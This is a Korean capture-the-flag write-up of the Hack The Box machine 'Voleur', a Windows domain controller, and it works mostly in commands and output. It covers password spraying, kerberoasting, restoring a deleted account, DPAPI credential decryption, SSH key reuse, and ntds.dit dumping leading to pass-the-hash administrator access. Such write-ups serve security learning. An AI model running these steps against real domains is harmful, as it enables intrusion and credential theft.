# HTB-VOLEUR
```bash
OS: Windows(AD)
DATE: 26.11.17
DIFFICULTY: Medium
```

## RECON
초기 정찰을 진행하기 전에 기본 크레덴셜을 받았다. 이후 nmap으로 전체 포트 검사와 상세 포트 검사를 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389,49664,49667,61443,61444,61445,61471,65052 IP | tee nmap
```
그 결과 88, 389 등의 서비스가 있는 것으로 보아 AD DC 서버인 것 같았다. 또한 2222번 포트에서 SSH 서비스가 동작하는 것을 확인할 수 있었다. 이후 초기에 받은 크레덴셜로 SMB 열거를 진행하였다.
```bash
nxc smb IP -u ryan.naylor -p HollowOct31Nyt

SMB         IP  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
```
그 결과 NTLM 인증이 불가능하였다. 따라서 getTGT.py로 유저의 캐시(ccache)를 발급받고 export한 후 다시 한 번 시도해 보았다.
```bash
getTGT.py voleur.htb/ryan.naylor:'HollowOct31Nyt' -dc-ip IP

[*] Saving ticket in ryan.naylor.ccache
```
```bash
export KRB5CCNAME=$(pwd)/ryan.naylor.ccache
```
```bash
nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
```
접속에 성공하였다. 이제 공유 폴더가 있는지 확인해 보았다.
```bash
nxc smb dc.voleur.htb -u ryan.naylor -p HollowOct31Nyt -k --shares

SMB         dc.voleur.htb   445    dc               Share           Permissions            Remark
SMB         dc.voleur.htb   445    dc               -----           -----------            ------
SMB         dc.voleur.htb   445    dc               ADMIN$                                 Remote Admin
SMB         dc.voleur.htb   445    dc               C$                                     Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ                   Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ                   Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ                   Logon server share
```
그 결과 IT 공유 폴더에 읽기 권한이 있다는 것을 알 수 있었다. 이후 다시 열거하기 전에 bloodhound를 돌려 보았다.
```bash
bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns IP -c all -k
```
```bash
bloodhound-start
```
확인해 본 결과 Outbound 관계가 전혀 없었다.

## Initial Access
앞에서 발견한 IT 공유 폴더를 열거해 보았다.
```bash
smbclient //dc.voleur.htb/IT -U ryan.naylor%HollowOct31Nyt -k
```
```bash
smb > ls

First-Line Support
smb > cd "First-Line Support"
```
열거해 본 결과 `First-Line Support` 폴더가 있었고, 그 안에 `Access_Review.xlsx` 엑셀 파일이 있었다. 이 파일을 로컬로 옮겼다.
```bash
smb > get Access_Review.xlsx
```
엑셀 파일을 열어 보려 했지만 비밀번호가 걸려 있었다. 따라서 비밀번호를 크랙할 수 있도록 먼저 office2john.py로 해시를 추출하였다.
```bash
python3 office2john.py Access_Review.xlsx > hash
```
이후 john으로 크랙을 시도하였다.
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
그 결과 엑셀 파일의 비밀번호를 평문으로 알아낼 수 있었다. 이제 파일을 열어 보았다.

![ex](attach_real/Pasted%20image%2020261118021337.png)

파일 내용을 살펴보니 서비스 계정들의 평문 비밀번호가 있었고, 삭제된 유저 todd의 패스워드도 보였다. 이 세 가지 패스워드를 모두 담은 pass라는 워드리스트를 만든 후, 도메인 유저들이 담겨 있는 users 리스트를 이용해 password spray를 진행하였다.
```bash
nxc smb dc.voleur.htb -u users -p pass --continue-on-success -k

[+] voleur.htb\svc_ldap:M1XyC9pW7qT5Vn
[+] voleur.htb\svc_iis:N5pXyW1VqM7CZ8
```
검사 결과 두 서비스 계정의 크레덴셜을 얻을 수 있었다. 이제 아까 돌린 bloodhound로 확인해 본 결과, iis는 아무것도 없었고 ldap은 outbound 관계가 있었다.

![blod](attach_real/Pasted%20image%2020261118022402.png)

확인 결과 svc_ldap 계정은 winrm 서비스 계정과 WriteSPN 관계였고, lacey.miller 및 SECOND.. OU와는 GenericWrite 관계인 것을 알 수 있었다. 먼저 lacey.miller 유저를 대상으로 abusing을 진행하였다. `certipy shadow`를 이용해 abusing을 시도해 보았다.
```bash
 certipy-ad shadow auto \

  -u 'svc_ldap@voleur.htb' -k -no-pass \
  -account 'LACEY.MILLER' \
  -dc-ip IP \
  -dc-host dc.voleur.htb \
  -target dc.voleur.htb
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[-] Got error: socket ssl wrapping error: [Errno 104] Connection reset by peer
[-] Use -debug to print a stacktrace
```
하지만 LDAPS 서비스가 동작하지 않아 아무런 결과를 얻지 못했고, 다른 경로로 접근해 보았다. svc_ldap 계정이 winrm 서비스 계정에 대해 가진 WriteSPN 관계를 악용하여 kerberoast 해시를 추출해 보았다.
```bash
python3 targetedKerberoast.py -v -k -d 'voleur.htb' -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' --dc-host dc.voleur.htb
```
해시를 추출한 후 hashcat으로 크랙해 보았다.
```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```
이로써 winrm 서비스 계정의 평문 비밀번호를 얻었다. 이제 winrm에 접속하기 위해 TGT 티켓을 발급받아 환경 변수에 등록하였다.
```bash
getTGT.py voleur.htb/svc_winrm:'AFireInsidedeOzarctica980219afi' -dc-ip IP
```
```bash
export KRB5CCNAME=$(pwd)/svc_winrm.ccache
```
이제 -i 옵션에 FQDN을, -r 옵션에 도메인을 입력하여 접속을 시도하였다.
```bash
evil-winrm -i dc.voleur.htb -r voleur.htb
```
그 결과 유저 쉘을 얻었고, 유저 플래그도 확인할 수 있었다.

![user](attach_real/Pasted%20image%2020261117225913.png)

## Privilege Escalation
쉘을 얻은 후 권한 상승 경로를 찾아보았지만 별다른 결과를 얻지 못하였다. 따라서 다시 앞 단계로 돌아가 ldap 서비스 계정을 유심히 살펴보았다. 그 결과 해당 서비스 계정이 Restore Users라는 그룹에 속해 있었다. 삭제된 계정을 복구할 수 있는 권한을 가진 계정이라고 생각해 조회해 보았다.
```bash
getTGT.py voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip IP
export KRB5CCNAME=$(pwd)/svc_ldap.ccache
```
```bash
bloodyAD --host dc.voleur.htb -d voleur.htb --dc-ip IP -k get search -c 1.2.840.113556.1.4.417 -c 1.2.840.113556.1.4.2064 --filter '(&(objectClass=user)(isDeleted=TRUE))'

logonCount: 17
msDS-LastKnownRDN: Todd Wolfe
nTSecurityDescriptor: O:S-1-5-21-3927696377-1337352550-2781715495-512G:S-1-5-21-3927696377-1337352550-2781715495-512D:AI(OD;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-1-0)(OD;;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;;S-1-5-10)(OA;;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3927696377-1337352550-2781715495-553)(OA;;RP;5f202010-79a5-11d0-9020-00c04fc2d4cf;;S-1-5-21-3927696377-1337352550-2781715495-553)(OA;;RP;bc0ac240-79a9-11d0-9020-00c04fc2d4cf;;S-1-5-21-3927696377-1337352550-2781715495-553)(OA;;RP;037088f8-0ae1-11d2-b422-00a0c968f939;;S-1-5-21-3927696377-1337352550-2781715495-553)(OA;;0x30;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3927696377-1337352550-2781715495-517)(OA;;RP;46a9b11d-60ae-405a-b7e8-ff8a58d456d2;;S-1-5-32-560)(OA;;0x30;6db69a1c-9422-1
```
그 결과 아까 엑셀에서도 보았던 Todd Wolfe 유저가 삭제된 것을 확인할 수 있었다. 이제 복구 그룹 권한을 활용해 복구를 진행해 보았다.
```bash
bloodyAD --host dc.voleur.htb -d voleur.htb --dc-ip IP -k set restore todd.wolfe
```
이제 마찬가지로 TGT 티켓을 발급받고, 패스워드는 아까 엑셀에서 발견한 것을 사용해 nxc로 접속이 가능한지 확인해 보았다.
```bash
getTGT.py voleur.htb/todd.wolfe:'NightT1meP1dg3on14' -dc-ip IP
```
```bash
export KRB5CCNAME=$(pwd)/todd.wolfe.ccache
```
```bash
nxc smb dc.voleur.htb -u Todd.Wolfe -p NightT1meP1dg3on14 -k
```
그 결과 SMB 인증에 성공하였다. 이제 다시 한 번 공유 폴더를 확인해 보았다.
```bash
nxc smb dc.voleur.htb -u Todd.Wolfe -p NightT1meP1dg3on14 -k --shares

SMB         dc.voleur.htb   445    dc               Share           Permissions            Remark
SMB         dc.voleur.htb   445    dc               -----           -----------            ------
SMB         dc.voleur.htb   445    dc               ADMIN$                                 Remote Admin
SMB         dc.voleur.htb   445    dc               C$                                     Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ                   Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ                   Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ                   Logon server share
```
조회 결과 IT 폴더가 또 있는 것을 확인하였다. 이번에는 smbclient로 다시 한 번 살펴보았다.
```bash
smbclient -k //dc.voleur.htb/IT -U Todd.Wolfe%NightT1meP1dg3on14
```
```bash
smb > ls
Second-Line Support

smb > cd "Second-Line Support"
smb > ls
Archived Users

smb > cd "Archived Users"
smb > ls

smb > cd todd.wolfe
smb > ls
 .                                   D        0  Thu Jan 30 00:13:10 2025
  ..                                  D        0  Thu Jan 30 00:13:06 2025
  3D Objects                         DR        0  Thu Jan 30 00:13:06 2025
  AppData                            DH        0  Thu Jan 30 00:13:09 2025
  Contacts                           DR        0  Thu Jan 30 00:13:10 2025
  Desktop                            DR        0  Thu Jan 30 23:28:50 2025
  Documents                          DR        0  Thu Jan 30 00:13:10 2025
  Downloads                          DR        0  Thu Jan 30 00:13:10 2025
  Favorites                          DR        0  Thu Jan 30 00:13:10 2025
  Links                              DR        0  Thu Jan 30 00:13:10 2025
  Music                              DR        0  Thu Jan 30 00:13:10 2025
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf    AHS    65536  Thu Jan 30 00:13:06 2025
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Wed Jan 29 21:53:07 2025
  NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Wed Jan 29 21:53:07 2025
  ntuser.ini                        AHS       20  Wed Jan 29 21:53:07 2025
  Pictures                           DR        0  Thu Jan 30 00:13:10 2025
  Saved Games                        DR        0  Thu Jan 30 00:13:10 2025
  Searches                           DR        0  Thu Jan 30 00:13:10 2025
  Videos                             DR        0  Thu Jan 30 00:13:10 2025
```
SMB 폴더를 열거해 본 결과 todd.wolfe 유저의 디렉토리로 보이는 여러 폴더가 나왔다. 따라서 recurse on 명령어로 하위 폴더까지 뒤져 보았다.
```bash
smb > recurse on
smb > ls
```
그 결과 AppData의 Credentials 폴더 등 여러 폴더가 노출되어 있는 것을 확인하였고, `dpapi`로 masterkey와 credential을 복호화할 수 있겠다는 생각이 들었다. 따라서 masterkey 파일과 credential 파일을 모두 로컬로 옮겨 왔다.
```bash
smb > AppData\Roaming\Microsoft\Protect\SID
smb > get 08949382-134f-4c63-b93c-ce52efc0aa88
```
```bash
smb > cd AppData\Local\Microsoft\Credentials
smb > get DFBE70A7E5CC19A398EBF1B96859CE5D
```
파일을 모두 로컬로 옮긴 후 마스터키부터 복호화를 진행하였다.
```bash
impacket-dpapi masterkey -file master -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110

Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```
```bash
impacket-dpapi credential -file credential -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83'

KeyWord : Microsoft_WindowsLive:authstate:0
Data    :
 0000   01 00 00 00 D0 8C 9D DF  01 15 D1 11 8C 7A 00 C0   .............z..
 0010   4F C2 97 EB 01 00 00 00  56 3E F0 43 9A 7E 25 47   O.......V>.C.~%G
 0020   AD 0D 14 50 50 1C 82 AA  00 00 00 00 02 00 00 00   ...PP...........
 0030   00 00 10 66 00 00 00 01  00 00 20 00 00 00 77 BC   ...f...... ...w.
 0040   33 CC 11 25 B2 28 2C 53  38 B6 BF 79 0C 61 47 9D   3..%.(,S8..y.aG.
 0050   FF B3 C2 61 86 33 57 38  B1 6B D1 AC 27 86
```
복호화 결과 크레덴셜은 나오지 않고 이상한 문자열만 출력되었다. 알고 보니 로컬 전용 크레덴셜을 뽑은 것이라 쓸모없는 값이었고, Roaming, 즉 도메인 자격증명이 있는 경로에서 다시 추출하여 복호화를 진행해 보았다.
```bash
smb > cd AppData\Roaming\Microsoft\Credentials
smb > get 772275FAD58525253490A9B0039791D3
```
```bash
impacket-dpapi credential -file credential -key '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83'

Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description :
Unknown     :
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```
그 결과 `jeremy.combs` 유저의 크레덴셜을 얻을 수 있었다. 이제 똑같이 TGT 티켓을 발급받은 후 nxc로 확인해 보았다.
```bash
getTGT.py voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m' -dc-ip IP
```
```bash
export KRB5CCNAME=$(pwd)/jeremy.combs.ccache
```
```bash
nxc smb dc.voleur.htb -u jeremy.combs -p qT3V9pLXyN7W4m -k
```
그 결과 새로운 유저로 접속할 수 있었다. 앞에서와 마찬가지로 공유 폴더를 확인해 보았다.
```bash
nxc smb dc.voleur.htb -u jeremy.combs -p qT3V9pLXyN7W4m -k --shares

SMB         dc.voleur.htb   445    dc               Share           Permissions            Remark
SMB         dc.voleur.htb   445    dc               -----           -----------            ------
SMB         dc.voleur.htb   445    dc               ADMIN$                                 Remote Admin
SMB         dc.voleur.htb   445    dc               C$                                     Default share
SMB         dc.voleur.htb   445    dc               Finance
SMB         dc.voleur.htb   445    dc               HR
SMB         dc.voleur.htb   445    dc               IPC$            READ                   Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ
SMB         dc.voleur.htb   445    dc               NETLOGON        READ                   Logon server share
SMB         dc.voleur.htb   445    dc               SYSVOL          READ                   Logon server share
```
그 결과 똑같은 IT 공유 폴더가 있다는 것을 확인할 수 있었다. 공유 폴더 이름이 같아도 유저마다 들어 있는 파일이 다를 수 있으므로 다시 한 번 접속해 보았다.
```bash
kinit jeremy.combs
```
```bash
smbclient //dc.voleur.htb/IT -U jeremy.combs%qT3V9pLXyN7W4m -k

smb > ls
Third-Line Support

smb > cd "Third-Line Support"
smb > ls
 .                                   D        0  Fri Jan 31 01:11:29 2025
  ..                                  D        0  Wed Jan 29 18:10:01 2025
  id_rsa                              A     2602  Fri Jan 31 01:10:54 2025
  Note.txt.txt                        A      186  Fri Jan 31 01:07:35 2025
```
확인 결과 `Third-Line Support` 폴더 안에 SSH 키로 보이는 id_rsa와 Note 텍스트 파일이 있었다. 두 파일을 모두 로컬로 가져와 확인해 보았다.
```bash
cat Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin
```
그 결과 WSL에 백업을 해 둔다는 admin의 노트를 확인할 수 있었다. SSH로 admin과 jeremy 계정 모두 접속이 가능한지 확인해 보았지만 불가능하였다. 따라서 다른 유저들도 더 확인해 보았고, svc_backup 유저가 있는 것을 발견하여 접속이 가능한지 확인해 보았다.
```bash
ssh -i id_rsa svc_backup@dc.voleur.htb -p 2222
```
SSH 접속에 성공하였다. 접속 후 /mnt 폴더로 이동해 WSL에 백업해 둔 파일들을 확인해 보았다.
```bash
cd /mnt/c
```
폴더 안을 계속 열거해 보았지만 중요한 것은 발견하지 못하였다. 그래서 AD 백업이라면 ntds.dit 파일과 SYSTEM 파일이 있을 것이라 생각하고 확인해 보았다.
```bash
find / -iname 'ntds.dit' 2>/dev/null

/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
```
ntds.dit 백업 파일을 발견하였다. 이제 scp로 로컬로 옮겼다.
```bash
scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:'/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit' .
```
이후 SYSTEM 파일도 같은 방식으로 옮겼다.
```bash
find / -iname 'system' 2>/dev/null

/etc/systemd/system
/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM
```
```bash
scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:'/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM' .
```
이후 secretsdump로 덤프를 진행하였다.
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```
그 결과 domain admin의 NT 해시를 얻을 수 있었다. 이제 똑같이 TGT 티켓을 발급받고 winrm으로 접속하였다.
```bash
getTGT.py voleur.htb/administrator -hashes :e656e07c56d831611b577b160b259ad2 -dc-ip IP
```
```bash
export KRB5CCNAME=$(pwd)/administrator.ccache
```
```bash
evil-winrm -i dc.voleur.htb -r voleur.htb
```
그 결과 administrator 권한의 쉘과 루트 플래그를 얻을 수 있었다.

![admin](attach_real/Pasted%20image%2020261118012748.png)

## New Information
- kerberos 인증 방식일 때는 TGT 티켓을 먼저 받아 export하는 방식을 사용하자
- kerberoast 인증을 할 때는 무조건 DC 도메인을 사용하자
- smbclient를 사용할 때는 kinit으로 인증하자
- bloodhound에 나온다고 해서 모두 성공하는 것은 아니다. 여러 경로가 있을 때 하나가 안 되면 다른 경로를 시도해 보자
- winrm을 kerberos로 인증할 때는 getTGT → export → -i FQDN -r domain 순서로 접속할 수 있다. -K 옵션은 아니다
- 복구 그룹에 속해 있다면 삭제될 수 있는 유저를 고려하자. 그리고 복구를 진행하자
- SMB 공유 폴더 이름이 같더라도 유저마다 다르게 보일 수 있고, 다른 파일이 들어 있을 수 있다
- 항상 dpapi를 생각하자
- dpapi에서 local은 로컬, roaming은 도메인 자격증명이다. local에서 실패하면 roaming에서 재시도하자
- AD에는 svc_backup 같은 서비스 계정이 있을 수 있다
- ssh 접속할 때 yes를 입력하지 않으면 접속할 수 없다
- ssh 접속에 kerberos 인증을 사용하지 않는 이유는 AD가 아니라 별개의 Linux SSH 서비스이기 때문이다
- 도메인 권한 상승을 생각할 때는 ntds dump를 떠올리자
- find 명령어로 찾을 때는 -iname을 사용하면 대소문자 구분 없이 검색할 수 있다
- 해시로 TGT 티켓을 발급받을 때는 :hash 형식으로 등록한다